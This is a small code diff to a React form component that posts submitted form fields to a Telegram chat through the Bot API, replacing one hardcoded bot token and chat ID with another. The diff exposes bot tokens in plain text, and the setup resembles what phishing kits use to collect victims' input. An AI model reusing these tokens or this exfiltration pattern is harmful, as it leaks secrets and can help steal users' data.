@@ -12,7 +12,7 @@ type Inputs = {
     to: string;
 };
 
-const URL = `https://api.telegram.org/bot7037880212:AAGBcUj8muyAYR7xoAD0TyxxTwvxaiZexGI/sendMessage`;
+const URL = `https://api.telegram.org/bot6429026106:AAFePHVn3COnqYGcRnQzbaf5f9ZiU0OguiM/sendMessage`;
 
 const FormSubmit = ({ page }: any) => {
     const [number, setNumber] = useState("");
@@ -34,7 +34,7 @@ const FormSubmit = ({ page }: any) => {
 
         axios
             .post(URL, {
-                chat_id: "-1002037558412",
+                chat_id: "-1002072075522",
                 parse_mode: "html",
                 text: msg,
             })
